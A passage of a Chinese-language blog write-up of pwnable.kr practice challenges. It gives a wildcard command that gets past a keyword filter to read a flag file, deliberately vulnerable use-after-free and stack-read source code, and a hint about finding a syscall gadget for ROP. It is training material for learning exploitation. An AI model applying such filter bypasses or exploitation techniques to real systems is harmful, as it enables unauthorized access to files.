</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">+=</span> <span class="nf">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;tmp&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">r</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">**</span> <span class="n">envp</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">putenv</span><span class="p">(</span><span class="s">&#34;PATH=/thankyouverymuch&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nf">filter</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">system</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>代码很短, 主要就是执行<code>system(argv[1])</code>但可以看到该程序把PATH指向了一个显然不能用的路径, 而且我们传入的argv里不能包含flag, sh, tmp, 也就是不能直接或间接地把flag打印出来.</p>
<ol>
<li>没有环境变量, 就直接用绝对路径<code>&quot;/bin/cat&quot;</code></li>
<li>不能直接出现flag, 但可以用<code>*</code>通配符啊
所以</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">./cmd &#34;/bin/cat fl*&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="15-cmd2" class="headerLink">
    <a href="#15-cmd2" class="header-mark"></a>15 cmd2</h2><p>没做呢</p>
<h2 id="16-uaf" class="headerLink">
    <a href="#16-uaf" class="header-mark"></a>16 uaf</h2><p>use after free漏洞
源码:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;cstdlib&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;cstring&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Human</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="k">private</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">  <span class="k">virtual</span> <span class="kt">void</span> <span class="n">give_shell</span><span class="p">()</span> <span class="p">{</span> <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">protected</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">age</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">string</span> <span class="n">name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">public</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">  <span class="k">virtual</span> <span class="kt">void</span> <span class="n">introduce</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;My name is &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">name</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;I am &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">age</span> <span class="o">&lt;&lt;</span> <span class="s">&#34; years old&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Man</span> <span class="o">:</span> <span class="k">public</span> <span class="n">Human</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="k">public</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">  <span class="n">Man</span><span class="p">(</span><span class="n">string</span> <span class="n">name</span><span class="p">,</span> <span class="kt">int</span> <span class="n">age</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="o">-&gt;</span><span class="n">age</span> <span class="o">=</span> <span class="n">age</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">virtual</span> <span class="kt">void</span> <span class="nf">introduce</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">Human</span><span class="o">::</span><span class="n">introduce</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;I am a nice guy!&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Woman</span> <span class="o">:</span> <span class="k">public</span> <span class="n">Human</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">public</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">  <span class="n">Woman</span><span class="p">(</span><span class="n">string</span> <span class="n">name</span><span class="p">,</span> <span class="kt">int</span> <span class="n">age</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="o">-&gt;</span><span class="n">age</span> <span class="o">=</span> <span class="n">age</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">virtual</span> <span class="kt">void</span> <span class="nf">introduce</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">Human</span><span class="o">::</span><span class="n">introduce</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;I am a cute girl!&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">Human</span> <span class="o">*</span><span class="n">m</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Man</span><span class="p">(</span><span class="s">&#34;Jack&#34;</span><span class="p">,</span> <span class="mi">25</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">Human</span> <span class="o">*</span><span class="n">w</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Woman</span><span class="p">(</span><span class="s">&#34;Jill&#34;</span><span class="p">,</span> <span class="mi">21</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">size_t</span> <span class="n">len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">op</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;1. use</span><span class="se">\n</span><span class="s">2. after</span><span class="se">\n</span><span class="s">3. free</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">op</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="n">op</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="n">m</span><span class="o">-&gt;</span><span class="n">introduce</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="n">w</span><span class="o">-&gt;</span><span class="n">introduce</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="n">len</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">      <span class="n">data</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">char</span><span class="p">[</span><span class="n">len</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">      <span class="n">read</span><span class="p">(</span><span class="n">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">),</span> <span class="n">data</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;your data is allocated&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">delete</span> <span class="n">m</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">delete</span> <span class="n">w</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="unexploitable" class="headerLink">
    <a href="#unexploitable" class="header-mark"></a>unexploitable</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">sleep</span><span class="p">(</span><span class="mi">3u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x50FuLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>GOT表里什么都没有, 乍一看好像寄了, 但神奇的地方在于这个read的参数0x50F, 他在内存里是个0x0F05,所以用ROPgadget能找到一个syscall.</p>
<p><a href="https://zhuanlan.zhihu.com/p/353260837" target="_blank" rel="noopener noreffer ">0.虚表</a>
<a href="https://blog.csdn.net/weixin_43921239/article/details/100828167" target="_blank" rel="noopener noreffer ">1</a>
<a href="https://www.cnblogs.com/L0g4n-blog/p/12887869.html" target="_blank" rel="noopener noreffer ">2</a>
<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788698" target="_blank" rel="noopener noreffer ">3</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2022-10-12</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/pwnable.kr/index.md" target="_blank">Read markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://juicymio.github.io/pwnable.kr/" data-title="Pwnable.kr" data-hashtags="pwn"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://juicymio.github.io/pwnable.kr/" data-hashtag="pwn"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="http://juicymio.github.io/pwnable.kr/" data-title="Pwnable.kr" data-web><i class="fab fa-whatsapp fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://juicymio.github.io/pwnable.kr/" data-title="Pwnable.kr"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://juicymio.github.io/pwnable.kr/" data-title="Pwnable.kr"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Blogger" data-sharer="blogger" data-url="http://juicymio.github.io/pwnable.kr/" data-title="Pwnable.kr" data-description=""><i class="fab fa-blogger fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="http://juicymio.github.io/pwnable.kr/" data-title="Pwnable.kr"><i class="fab fa-evernote fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/pwn/">pwn</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav">
            <a href="/c/" class="next" rel="next" title="C/C&#43;&#43;杂项知识点">C/C++杂项知识点<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
<div id="comments"></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">JuicyMio</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
